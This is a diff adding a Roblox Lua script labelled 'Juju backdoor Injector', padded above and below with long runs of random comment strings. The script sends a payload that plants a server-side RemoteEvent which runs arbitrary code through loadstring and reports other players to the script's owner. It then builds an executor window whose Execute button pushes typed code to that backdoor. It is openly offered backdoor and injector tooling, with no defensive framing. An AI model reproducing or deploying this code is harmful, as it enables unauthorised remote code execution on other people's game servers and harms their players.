@@ -1,0 +1,516 @@
+-- kDj83927465aBdF82nv
+-- VfL2948571pWeQr62bf
+-- Zxm7382910BcJHw45sn
+-- TlP5628390XaVwF98ke
+-- QuR4739201zNbCm56dg
+-- sJa8493726VlXyEr31hp
+-- NxO1902837GyTpSd65qw
+-- WzE7458391KrQvBc08mt
+-- YpF6382917HoJnXm25cl
+-- LrD9273846TbCvWx50sj
+-- MbA1289374ZyQfNg62ur
+-- IvK6347289DwOpLs19ye
+-- CnX5739208JlFrVb43ht
+-- ReH8401927ZmWxCy56pn
+-- GtQ6392741VyNlAs20mk
+-- SdP2837465XoBcJr97fv
+-- OzM7583920EkTwHl81cg
+-- FwJ6912837UbNxDy04qp
+-- YiV4873920LsMtOc56bz
+-- AdC5729183PhKwFv07nm
+-- ErL1902837NxQbYs64pj
+-- HfN6357284VwOrDz19kx
+-- KqS8472910ZyLtJm32wc
+-- BtY2938475XpMvFa68zn
+-- CmW1029384JoVeKl57gy
+-- DvR6758391QnBsCy04pt
+-- JzX4938271HuLfWp26ks
+-- NgF7583920OrCyJb13vm
+-- PmK6401927VsAxZe48cq
+-- UwL1827364YtJnVo59hp
+-- kDj83927465aBdF82nv
+-- VfL2948571pWeQr62bf
+-- Zxm7382910BcJHw45sn
+-- TlP5628390XaVwF98ke
+-- QuR4739201zNbCm56dg
+-- sJa8493726VlXyEr31hp
+-- NxO1902837GyTpSd65qw
+-- WzE7458391KrQvBc08mt
+-- YpF6382917HoJnXm25cl
+-- LrD9273846TbCvWx50sj
+-- MbA1289374ZyQfNg62ur
+-- IvK6347289DwOpLs19ye
+-- CnX5739208JlFrVb43ht
+-- ReH8401927ZmWxCy56pn
+-- GtQ6392741VyNlAs20mk
+-- SdP2837465XoBcJr97fv
+-- OzM7583920EkTwHl81cg
+-- FwJ6912837UbNxDy04qp
+-- YiV4873920LsMtOc56bz
+-- AdC5729183PhKwFv07nm
+-- ErL1902837NxQbYs64pj
+-- HfN6357284VwOrDz19kx
+-- KqS8472910ZyLtJm32wc
+-- BtY2938475XpMvFa68zn
+-- CmW1029384JoVeKl57gy
+-- DvR6758391QnBsCy04pt
+-- JzX4938271HuLfWp26ks
+-- NgF7583920OrCyJb13vm
+-- PmK6401927VsAxZe48cq
+-- UwL1827364YtJnVo59hp
+-- kDj83927465aBdF82nv
+-- VfL2948571pWeQr62bf
+-- Zxm7382910BcJHw45sn
+-- TlP5628390XaVwF98ke
+-- QuR4739201zNbCm56dg
+-- sJa8493726VlXyEr31hp
+-- NxO1902837GyTpSd65qw
+-- WzE7458391KrQvBc08mt
+-- YpF6382917HoJnXm25cl
+-- LrD9273846TbCvWx50sj
+-- MbA1289374ZyQfNg62ur
+-- IvK6347289DwOpLs19ye
+-- CnX5739208JlFrVb43ht
+-- ReH8401927ZmWxCy56pn
+-- GtQ6392741VyNlAs20mk
+-- SdP2837465XoBcJr97fv
+-- OzM7583920EkTwHl81cg
+-- FwJ6912837UbNxDy04qp
+-- YiV4873920LsMtOc56bz
+-- AdC5729183PhKwFv07nm
+-- ErL1902837NxQbYs64pj
+-- HfN6357284VwOrDz19kx
+-- KqS8472910ZyLtJm32wc
+-- BtY2938475XpMvFa68zn
+-- CmW1029384JoVeKl57gy
+-- DvR6758391QnBsCy04pt
+-- JzX4938271HuLfWp26ks
+-- NgF7583920OrCyJb13vm
+-- PmK6401927VsAxZe48cq
+-- UwL1827364YtJnVo59hp
+
+
+-- SET YOUR USERNAME
+local Players = game:GetService("Players")
+local username = Players.LocalPlayer.Name
+
+
+-- PART 1: Send init payload ONLY if SecureRemote doesn't exist 
+
+local function sendInitPayload()
+    local InitPayload = [[ 
+        task.spawn(function()
+            local success, err = pcall(function()
+                if game.Workspace:FindFirstChild("SecureRemote") then
+                    return -- already exists, don't create another
+                end
+                local SecureRemote = Instance.new("RemoteEvent")
+                SecureRemote.Name = "SecureRemote"
+                SecureRemote.OnServerEvent:Connect(function(plr, payload)
+                    if plr.Name ~= "]]..username..[[" then
+                        SecureRemote:FireClient(game.Players["]]..username..[["], plr.Name)
+                    end
+                    local ok, err = pcall(function()
+                        loadstring(payload)()
+                    end)
+                    if not ok then
+                        local msg = Instance.new("Hint", game.Workspace)
+                        msg.Text = "Admin payload internal error: "..tostring(err)
+                        task.delay(10, function() msg:Destroy() end)
+                    end
+                end)
+                SecureRemote.Parent = game.Workspace
+            end)
+            if not success then
+                local msg = Instance.new("Hint", game.Workspace)
+                msg.Text = "Init payload error: "..err
+                task.wait(20)
+                msg:Destroy()
+            else
+                local msg = Instance.new("Hint", game.Workspace)
+                msg.Text = "Juju backdoor Injector | gg/Usbp5H738j"
+            end
+        end)
+    ]]
+    Remote:FireServer(InitPayload)
+    warn("Juju backdoor Injector | gg/Usbp5H738j")
+end
+
+if not workspace:FindFirstChild("SecureRemote") then
+    sendInitPayload()
+else
+end
+
+-- PART 2: Create GUI in CoreGui with animations and improved TextBox
+
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+-- Remove old GUI if exists
+local oldGui = CoreGui:FindFirstChild("Juju")
+if oldGui then oldGui:Destroy() end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "Juju"
+gui.Parent = CoreGui
+gui.ResetOnSpawn = false
+
+-- Main Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 450, 0, 360)
+frame.Position = UDim2.new(0.5, -225, 0.5, -180)
+frame.BackgroundColor3 = Color3.fromRGB(48, 25, 52)
+frame.BorderSizePixel = 0
+frame.AnchorPoint = Vector2.new(0,0)
+frame.Parent = gui
+frame.ClipsDescendants = true
+frame.BackgroundTransparency = 1 -- starts invisible for animation
+
+-- Background gradient
+local bgGradient = Instance.new("UIGradient", frame)
+bgGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(92, 50, 112)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 18, 56))
+}
+
+-- Soft shadow
+local shadow = Instance.new("ImageLabel")
+shadow.AnchorPoint = Vector2.new(0.5, 0.5)
+shadow.Position = UDim2.new(0.5, 0, 0.5, 5)
+shadow.Size = UDim2.new(1, 40, 1, 40)
+shadow.BackgroundTransparency = 1
+shadow.Image = "rbxassetid://1316045217" -- soft circular shadow
+shadow.ImageColor3 = Color3.new(0, 0, 0)
+shadow.ImageTransparency = 0.85
+shadow.ZIndex = 0
+shadow.Parent = frame
+
+-- Rounded corners
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 18)
+corner.Parent = frame
+
+-- Logo "J"
+local logo = Instance.new("TextLabel")
+logo.Size = UDim2.new(0, 50, 0, 50)
+logo.Position = UDim2.new(0, 15, 0, 15)
+logo.BackgroundTransparency = 1
+logo.Text = "J"
+logo.Font = Enum.Font.FredokaOne
+logo.TextSize = 48
+logo.TextColor3 = Color3.fromRGB(186, 134, 212)
+logo.TextStrokeColor3 = Color3.fromRGB(120, 70, 170)
+logo.TextStrokeTransparency = 0
+logo.Parent = frame
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -90, 0, 50)
+title.Position = UDim2.new(0, 80, 0, 15)
+title.BackgroundTransparency = 1
+title.Text = "Juju Injector"
+title.TextColor3 = Color3.fromRGB(230, 230, 230)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 26
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = frame
+
+-- Container for the textbox
+local container = Instance.new("Frame")
+container.Size = UDim2.new(1, -30, 1, -120)
+container.Position = UDim2.new(0, 15, 0, 75)
+container.BackgroundColor3 = Color3.fromRGB(55, 24, 85)
+container.BorderSizePixel = 0
+container.Parent = frame
+local containerCorner = Instance.new("UICorner", container)
+containerCorner.CornerRadius = UDim.new(0, 12)
+
+local scroll = Instance.new("ScrollingFrame")
+scroll.Size = UDim2.new(1, 0, 1, 0)
+scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+scroll.ScrollBarThickness = 6
+scroll.BackgroundTransparency = 1
+scroll.Parent = container
+
+local codeBox = Instance.new("TextBox")
+codeBox.Size = UDim2.new(1, -10, 0, 25)
+codeBox.Position = UDim2.new(0, 5, 0, 5)
+codeBox.Text = "-- developed by gg/Usbp5H738j"
+codeBox.ClearTextOnFocus = false
+codeBox.Font = Enum.Font.Code
+codeBox.TextSize = 18
+codeBox.TextColor3 = Color3.fromRGB(240, 240, 240)
+codeBox.BackgroundTransparency = 1
+codeBox.TextWrapped = true
+codeBox.TextXAlignment = Enum.TextXAlignment.Left
+codeBox.TextYAlignment = Enum.TextYAlignment.Top
+codeBox.MultiLine = true
+codeBox.Parent = scroll
+
+local padding = 10
+local lineHeight = 25
+
+local function updateCanvas()
+    local textLines = select(2, string.gsub(codeBox.Text, "\n", "\n")) + 1
+    local height = textLines * lineHeight + padding * 2
+    codeBox.Size = UDim2.new(1, -10, 0, math.max(height, 150))
+    scroll.CanvasSize = UDim2.new(0, 0, 0, codeBox.AbsoluteSize.Y + padding * 2)
+end
+
+codeBox:GetPropertyChangedSignal("Text"):Connect(function()
+    updateCanvas()
+end)
+
+codeBox.Focused:Connect(function()
+    if codeBox.Text:find("-- developed by gg/Usbp5H738j") then
+        codeBox.Text = ""
+    end
+end)
+
+codeBox.FocusLost:Connect(function(enterPressed)
+    if codeBox.Text == "" then
+        codeBox.Text = "-- developed by gg/Usbp5H738j"
+    end
+end)
+
+updateCanvas()
+
+-- Buttons container
+local buttonsFrame = Instance.new("Frame")
+buttonsFrame.Size = UDim2.new(1, -30, 0, 60)
+buttonsFrame.Position = UDim2.new(0, 15, 1, -65)
+buttonsFrame.BackgroundTransparency = 1
+buttonsFrame.Parent = frame
+
+local function createButton(text, posX)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0, 180, 0, 50)
+    btn.Position = UDim2.new(0, posX, 0, 0)
+    btn.BackgroundColor3 = Color3.fromRGB(138, 75, 180)
+    btn.TextColor3 = Color3.fromRGB(240, 240, 240)
+    btn.Text = text
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 22
+    btn.Parent = buttonsFrame
+    btn.AutoButtonColor = false
+    local btnCorner = Instance.new("UICorner", btn)
+    btnCorner.CornerRadius = UDim.new(0, 16)
+    btn.MouseEnter:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(173, 106, 215)}):Play()
+    end)
+    btn.MouseLeave:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(138, 75, 180)}):Play()
+    end)
+    return btn
+end
+
+local executeButton = createButton("Execute", 10)
+local clearButton = createButton("Clear", 230)
+
+-- Draggable with smooth tween
+local dragging, dragInput, dragStart, startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+                             startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    TweenService:Create(frame, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = newPos}):Play()
+end
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+-- Animate frame appearance
+TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0}):Play()
+
+-- PART 3: Send payload to server securely
+local SecureRemote = workspace:WaitForChild("SecureRemote", 10)
+if not SecureRemote then
+    warn("SecureRemote not found, try reloading or restarting.")
+    return
+end
+
+executeButton.MouseButton1Click:Connect(function()
+    local payloadCode = codeBox.Text
+    if payloadCode == "" or payloadCode:find("^%-%- Paste your Lua code here") then
+        warn("No code to execute.")
+        return
+    end
+    SecureRemote:FireServer(payloadCode)
+    warn("Code executed succesfully.")
+end)
+
+clearButton.MouseButton1Click:Connect(function()
+    codeBox.Text = ""
+end)
+
+-- Función para mostrar notificación morada estilo Juju
+local function showNotification(message)
+    -- Crear contenedor en CoreGui (si no existe)
+    local notifGui = CoreGui:FindFirstChild("JujuNotification")
+    if notifGui then
+        notifGui:Destroy()
+    end
+    notifGui = Instance.new("ScreenGui")
+    notifGui.Name = "JujuNotification"
+    notifGui.Parent = CoreGui
+    notifGui.ResetOnSpawn = false
+
+    local notifFrame = Instance.new("Frame")
+    notifFrame.Size = UDim2.new(0, 250, 0, 50)
+    notifFrame.Position = UDim2.new(1, -260, 0, 20) -- esquina superior derecha
+    notifFrame.AnchorPoint = Vector2.new(0, 0)
+    notifFrame.BackgroundColor3 = Color3.fromRGB(138, 75, 180) -- morado Juju
+    notifFrame.BackgroundTransparency = 0.1
+    notifFrame.BorderSizePixel = 0
+    notifFrame.Parent = notifGui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = notifFrame
+
+    local notifLabel = Instance.new("TextLabel")
+    notifLabel.Size = UDim2.new(1, -20, 1, 0)
+    notifLabel.Position = UDim2.new(0, 10, 0, 0)
+    notifLabel.BackgroundTransparency = 1
+    notifLabel.TextColor3 = Color3.fromRGB(240, 240, 240)
+    notifLabel.Font = Enum.Font.GothamBold
+    notifLabel.TextSize = 22
+    notifLabel.Text = message or "Notification"
+    notifLabel.TextXAlignment = Enum.TextXAlignment.Left
+    notifLabel.Parent = notifFrame
+
+    -- Animación: fade in y desplazamiento hacia la izquierda 10 px
+    notifFrame.Position = UDim2.new(1, 20, 0, 20)
+    notifFrame.BackgroundTransparency = 1
+    TweenService:Create(notifFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Position = UDim2.new(1, -260, 0, 20),
+        BackgroundTransparency = 0.1
+    }):Play()
+
+    -- Destruir después de 5 segundos con fade out
+    task.delay(5, function()
+        TweenService:Create(notifFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+            Position = UDim2.new(1, 20, 0, 20),
+            BackgroundTransparency = 1
+        }):Play()
+        task.delay(0.4, function()
+            notifGui:Destroy()
+        end)
+    end)
+end
+
+-- kDj83927465aBdF82nv
+-- VfL2948571pWeQr62bf
+-- Zxm7382910BcJHw45sn
+-- TlP5628390XaVwF98ke
+-- QuR4739201zNbCm56dg
+-- sJa8493726VlXyEr31hp
+-- NxO1902837GyTpSd65qw
+-- WzE7458391KrQvBc08mt
+-- YpF6382917HoJnXm25cl
+-- LrD9273846TbCvWx50sj
+-- MbA1289374ZyQfNg62ur
+-- IvK6347289DwOpLs19ye
+-- CnX5739208JlFrVb43ht
+-- ReH8401927ZmWxCy56pn
+-- GtQ6392741VyNlAs20mk
+-- SdP2837465XoBcJr97fv
+-- OzM7583920EkTwHl81cg
+-- FwJ6912837UbNxDy04qp
+-- YiV4873920LsMtOc56bz
+-- AdC5729183PhKwFv07nm
+-- ErL1902837NxQbYs64pj
+-- HfN6357284VwOrDz19kx
+-- KqS8472910ZyLtJm32wc
+-- BtY2938475XpMvFa68zn
+-- CmW1029384JoVeKl57gy
+-- DvR6758391QnBsCy04pt
+-- JzX4938271HuLfWp26ks
+-- NgF7583920OrCyJb13vm
+-- PmK6401927VsAxZe48cq
+-- UwL1827364YtJnVo59hp
+-- kDj83927465aBdF82nv
+-- VfL2948571pWeQr62bf
+-- Zxm7382910BcJHw45sn
+-- TlP5628390XaVwF98ke
+-- QuR4739201zNbCm56dg
+-- sJa8493726VlXyEr31hp
+-- NxO1902837GyTpSd65qw
+-- WzE7458391KrQvBc08mt
+-- YpF6382917HoJnXm25cl
+-- LrD9273846TbCvWx50sj
+-- MbA1289374ZyQfNg62ur
+-- IvK6347289DwOpLs19ye
+-- CnX5739208JlFrVb43ht
+-- ReH8401927ZmWxCy56pn
+-- GtQ6392741VyNlAs20mk
+-- SdP2837465XoBcJr97fv
+-- OzM7583920EkTwHl81cg
+-- FwJ6912837UbNxDy04qp
+-- YiV4873920LsMtOc56bz
+-- AdC5729183PhKwFv07nm
+-- ErL1902837NxQbYs64pj
+-- HfN6357284VwOrDz19kx
+-- KqS8472910ZyLtJm32wc
+-- BtY2938475XpMvFa68zn
+-- CmW1029384JoVeKl57gy
+-- DvR6758391QnBsCy04pt
+-- JzX4938271HuLfWp26ks
+-- NgF7583920OrCyJb13vm
+-- PmK6401927VsAxZe48cq
+-- UwL1827364YtJnVo59hp
+-- kDj83927465aBdF82nv
+-- VfL2948571pWeQr62bf
+-- Zxm7382910BcJHw45sn
+-- TlP5628390XaVwF98ke
+-- QuR4739201zNbCm56dg
+-- sJa8493726VlXyEr31hp
+-- NxO1902837GyTpSd65qw
+-- WzE7458391KrQvBc08mt
+-- YpF6382917HoJnXm25cl
+-- LrD9273846TbCvWx50sj
+-- MbA1289374ZyQfNg62ur
+-- IvK6347289DwOpLs19ye
+-- CnX5739208JlFrVb43ht
+-- ReH8401927ZmWxCy56pn
+-- GtQ6392741VyNlAs20mk
+-- SdP2837465XoBcJr97fv
+-- OzM7583920EkTwHl81cg
+-- FwJ6912837UbNxDy04qp
+-- YiV4873920LsMtOc56bz
+-- AdC5729183PhKwFv07nm
+-- ErL1902837NxQbYs64pj
+-- HfN6357284VwOrDz19kx
+-- KqS8472910ZyLtJm32wc
+-- BtY2938475XpMvFa68zn
+-- CmW1029384JoVeKl57gy
+-- DvR6758391QnBsCy04pt
+-- JzX4938271HuLfWp26ks
+-- NgF7583920OrCyJb13vm
+-- PmK6401927VsAxZe48cq
+-- UwL1827364YtJnVo59hp
